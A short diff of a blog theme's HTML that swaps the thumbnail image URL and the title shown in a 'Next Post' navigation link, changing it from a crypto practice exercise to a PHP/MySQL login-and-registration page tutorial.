-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzNZV.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzNZV.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                暑假第五周练习(一)Cypto练习</h3>
+                html+css+php+mysql简单的页面登陆与注册(数据库的交互)</h3>
                 <hr>
               </div>
             </a>
